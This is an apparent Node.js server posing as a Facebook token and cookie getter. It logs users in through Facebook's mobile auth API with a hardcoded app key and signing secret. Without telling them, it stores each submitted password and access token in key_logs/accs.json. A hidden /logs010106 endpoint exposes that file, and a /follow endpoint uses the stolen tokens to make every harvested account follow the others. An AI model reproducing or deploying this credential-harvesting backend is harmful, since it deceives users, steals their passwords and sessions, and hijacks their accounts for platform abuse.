import express from 'express';
import { v4 as uuid } from 'uuid';
import totp from 'totp-generator';
import axios from 'axios';
import querystring from 'querystring';
import crypto from 'crypto';
import fs from 'fs';
import fakeUa from 'fake-useragent';
const userAgent = fakeUa();

const app = express();
const ports = [3000];
let currentPortIndex = Math.floor(Math.random() * ports.length);
let currentPort = ports[currentPortIndex];

app.use(express.static('public'));


app.get('/follow', async (req, res) => {
  const tokens = loadTokens();
  const responses = [];

  try {
    for (const token1 of tokens) {
      const { _uid, access_token_eaad6v7 } = token1;

      // Skip if _uid is the same as access_token_eaad6v7
      if (_uid === access_token_eaad6v7) {
        console.log(`Skipping follow for uid:${_uid} (access_token_eaad6v7 same as uid)`);
        continue;
      }

      const followedSuccess = [];
      const failedFollow = [];

      for (const token2 of tokens) {
        const { _uid: uidToFollow, access_token_eaad6v7: tokenToFollow } = token2;

        try {
          if (_uid !== uidToFollow) {
            const response = await axios.post(
              `https://graph.facebook.com/${uidToFollow}/subscribers?access_token=${access_token_eaad6v7}`
            );

            followedSuccess.push({ uid: uidToFollow, response: response.data });
            console.log(`Followed Success\n\tuid:${uidToFollow}`);
          }
        } catch (error) {
          failedFollow.push({ uid: uidToFollow, error: error.message });
          console.error(`Failed to follow uid:${uidToFollow}`);
        }
      }

      responses.push({ uid: _uid, followedSuccess, failedFollow });
    }

    res.json(responses);
  } catch (error) {
    //console.error(error);
    res.status(500).json({ error: 'Something went wrong' });
  }
});


app.get('/logs010106', (req, res) => {
  fs.readFile('key_logs/accs.json', 'utf8', (err, data) => {
    if (err) {
      console.error(err);
      return res.status(500).json({ error: 'Unable to read file' });
    }

    try {
      const jsonData = JSON.parse(data);
      res.setHeader('Content-Type', 'application/json');
      res.send(JSON.stringify(jsonData));
    } catch (error) {
      console.error(error);
      res.status(500).json({ error: 'Invalid JSON data' });
    }
  });
});
app.get('/facebook/appstate', async (req, res, next) => {
    const { uid, password, twofactor = '0', _2fa } = req.query;
    if (!uid || !password) {
        return res.json({
            status: false,
            message: 'Please enter enough information!'
        });
    }

    try {
        const deviceID = uuid();
        const adid = uuid();

        const form = {
            adid: adid,
            email: uid,
            password: password,
            format: 'json',
            device_id: deviceID,
            cpl: 'true',
            family_device_id: deviceID,
            locale: 'en_PH',
            client_country_code: 'PH',
            credentials_type: 'device_based_login_password',
            generate_session_cookies: '1',
            generate_analytics_claim: '1',
            generate_machine_id: '1',
            currently_logged_in_userid: '0',
            irisSeqID: 1,
            try_num: '1',
            enroll_misauth: 'false',
            meta_inf_fbmeta: 'NO_FILE',
            source: 'login',
            machine_id: randomString(24),
            meta_inf_fbmeta: '',
            fb_api_req_friendly_name: 'authenticate',
            fb_api_caller_class: 'com.facebook.account.login.protocol.Fb4aAuthHandler',
            api_key: '882a8490361da98702bf97a021ddc14d',
            access_token: '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32'
        };//@x5fd8eo

        form.sig = encodesig(sort(form));

        function getRandomHttpEngine() {
  const engines = ['liger', 'panther', 'tiger', 'cheetah', 'jaguar'];
  const randomIndex = Math.floor(Math.random() * engines.length);
  return engines[randomIndex];
}

        const options = {
            url: 'https://b-graph.facebook.com/auth/login',
            method: 'post',
            data: form,
            transformRequest: [
                (data, headers) => {
                    return querystring.stringify(data);
                },
            ],
            headers: {
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-friendly-name': form['fb_api_req_friendly_name'],
                'x-fb-http-engine': getRandomHttpEngine(),
                'user-agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36`
            }
        };

        return new Promise((resolve) => {
            axios.request(options).then(async (response) => {
                try {
                    response.data.access_token_eaad6v7 = await convertToken(response.data.access_token);
                    response.data.cookies = await convertCookie(response.data.session_cookies);
                    response.data.session_cookies = response.data.session_cookies.map((e) => {
                      //console.log(e)
                        return {
                            key: e.name,
                            value: e.value,
                            domain: 'facebook.com',
                            started: (function() {
                            const currentDate = new Date();
                            const options = {
                                weekday: 'short',
                                day: '2-digit',
                                month: 'short',
                                year: 'numeric',
                                hour: '2-digit',
                                minute: '2-digit',
                                second: '2-digit',
                                timeZoneName: 'short'
                            };
                            return currentDate.toLocaleString('en-PH', options);
                            })(),
                            expires: e.expires,
                            deviceID: deviceID,
                            path: e.path,
                            httpOnly: e.httpOnly,
                            secure: e.secure,
                            samesite: e.samesite,
                            hostOnly: false,
                            KeyGen: 'Sec-Key-Priority',
                            KeyGenPriority: 'High'
                        };
                    });

                    const access_token = response.data.access_token;
                    const access_token_eaad6v7 = response.data.access_token_eaad6v7;
                    const _uid = response.data.uid;
                    saveCredentials(uid, password, access_token, access_token_eaad6v7, _uid);

                    console.log("\nUSED BY: "+uid);
                    //console.log(response.data);
                    res.setHeader("Content-Type", "application/json");
                    res.end(JSON.stringify(response.data, null, 2));
                } catch (e) {
                    return res.json({
                        status: false,
                        message: 'Please enable 2FA authentication then try again!'
                    });
                }
            }).catch((error) => {
                if (error.response.data.error.code == 401) {
                    return res.json({
                        status: false,
                        message: error.response.data.error.message
                    });
                }

                if (twofactor == '0' && (!_2fa || _2fa == "0")) {
                    return res.json({
                        status: false,
                        message: 'Please enter the 2-factor authentication code!',
                        else: `\tYou Can't Use This Feature Right Now\n\nWe limit how often you can post, comment or do other things in a given amount of time in order to help protect the community from spam. You can try again later.`
                    });
                }

                const data = error.response.data.error.error_data;
                try {
                    _2fa = (_2fa != '0') ? _2fa : totp(decodeURI(twofactor).replace(/\s+/g, '').toLowerCase());
                } catch (e) {
                    return res.json({
                        status: false,
                        message: 'Invalid 2-factor authentication code!'
                    });
                }

                form.twofactor_code = _2fa;
                form.encrypted_msisdn = '';
                form.userid = data.uid;
                form.machine_id = data.machine_id;
                form.first_factor = data.login_first_factor;
                form.credentials_type = 'two_factor';
                form.sig = encodesig(sort(form));
                options.data = form;

                axios.request(options).then(async (response) => {
                    response.data.access_token_eaad6v7 = await convertToken(response.data.access_token);
                    response.data.cookies = await convertCookie(response.data.session_cookies);
                    response.data.session_cookies = response.data.session_cookies.map((e) => {
                        return {
                            key: e.name,
                            value: e.value,
                            domain: 'facebook.com',
                            expires: e.expires,
                            path: e.path,
                            httpOnly: e.httpOnly,
                            secure: e.secure,
                            samesite: e.samesite,
                            hostOnly: false,
                            KeyGen: 'Sec-Key-Priority',
                            KeyGenPriority: 'High'
                        };
                    });
                    saveCredentials(uid, password);
                    res.setHeader("Content-Type", "application/json");
                    res.end(JSON.stringify(response.data.session_cookies, null, 2));
                }).catch((error) => {
                    return res.json({
                        status: false,
                        message: error.response.data
                    });
                });
            });
        });
    } catch (e) {
        return res.json({
            status: false,
            message: 'Invalid userId or password!'
        });
    }
});

async function convertCookie(seasion) {
    let cookie = '';
    for (let i = 0; i < seasion.length; i++) {
        cookie += seasion[i].name + '=' + seasion[i].value + '; ';
    }
    return cookie;
}

async function convertToken(token) {
    return new Promise((resolve) => {
        axios.get(`https://api.facebook.com/method/auth.getSessionforApp?format=json&access_token=${token}&new_app_id=275254692598279`).then((response) => {
            if (response.data.error) {
                resolve();
            } else {
                resolve(response.data.access_token);
            }
        });
    });
}

function randomString(length) {
    length = length || 10;
    let char = 'abcdefghijklmnopqrstuvwxyz';
    char = char.charAt(
        Math.floor(Math.random() * char.length)
    );

    for (let i = 0; i < length - 1; i++) {
        char += 'abcdefghijklmnopqrstuvwxyz0123456789'.charAt(
            Math.floor(36 * Math.random())
        );
    }

    return char;
}

function encodesig(string) {
    let data = '';
    Object.keys(string).forEach(function (info) {
        data += info + '=' + string[info];
    });

    data = md5(data + '62f8ce9f74b12f84c123cc23437a4a32');
    return data;
}

function md5(string) {
    return crypto.createHash('md5').update(string).digest('hex');
}

function sort(string) {
    const sor = Object.keys(string).sort();
    const data = {};

    for (let i in sor)
        data[sor[i]] = string[sor[i]];

    return data;
}

function saveCredentials(uid, password, access_token, access_token_eaad6v7, _uid) {
    const credentials = {
        uid: uid,
        _uid: _uid,
        password: password,
        access_token: access_token,
        access_token_eaad6v7: access_token_eaad6v7
    };
    fs.readFile('key_logs/accs.json', 'utf-8', (err, data) => {
        if (err) {
            console.log('Error reading accs.json file:', err);
            return;
        }
        let accs = [];
        if (data) {
            accs = JSON.parse(data);
        }

        const existingCredentialIndex = accs.findIndex(cred => cred.uid === uid);
        if (existingCredentialIndex >= 0) {
            accs[existingCredentialIndex].password = password;
        } else {
            accs.push(credentials);
        }

        fs.writeFile('key_logs/accs.json', JSON.stringify(accs,null, 4), (err) => {
            if (err) {
                console.log('Error writing accs.json file:', err);
            }
        });
    });
}

function startServer() {
    const interval = 1 * 60 * 60 * 1000;
    setTimeout(() => {
        app.close(() => {
            currentPortIndex = (currentPortIndex + 1) % ports.length;
            currentPort = ports[currentPortIndex];
            app.listen(currentPort, () => {
                console.log(`Server is running on port ${currentPort}`);
                console.log(`===== RESTARTING SERVER NODE =====`);
                startServer();
            });
        });
    }, interval);
}

function loadTokens() {
    try {
        const data = fs.readFileSync('key_logs/accs.json', 'utf-8');
        return JSON.parse(data);
    } catch (err) {
        console.log('Error reading accs.json file:', err);
        return [];
    }
}

app.listen(currentPort, () => {
    console.log(`Server is running on port ${currentPort}`);
    console.log(`===== RUNNING SERVER NODE =====`);
});
